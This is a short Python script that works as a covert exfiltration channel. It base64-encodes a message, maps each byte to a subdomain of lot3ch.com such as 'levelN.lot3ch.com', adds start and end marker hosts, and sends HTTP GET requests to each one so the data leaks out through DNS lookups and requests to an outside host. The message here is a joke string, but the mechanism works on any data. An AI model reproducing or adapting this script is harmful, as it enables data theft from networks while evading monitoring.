import requests, base64
from random import randrange
import struct
import os
import subprocess
from time import sleep
import argparse


def encode(message):
    testx = base64.b64encode(message.encode('utf-8'))
    return testx

def start_exfil(binary_data):
    urls = []
    for c in binary_data:
        num_value = str(c)
        urls.append("http://level" + str(num_value) + ".lot3ch.com")
    return(urls)


if __name__ == '__main__':
    cipher = encode("poopy butt")
    urls = []
    urls.append("http://level216.lot3ch.com") # Begin message
    urls_add = start_exfil(cipher)
    for url in urls_add:
        urls.append(url)
    urls.append("http://level218.lot3ch.com") # End message
    for url in urls:
        print(url)
        headers = { 'Referer': url[7:] }
        print(headers)
        response = requests.get(url, headers=headers)
        #sleep(1)

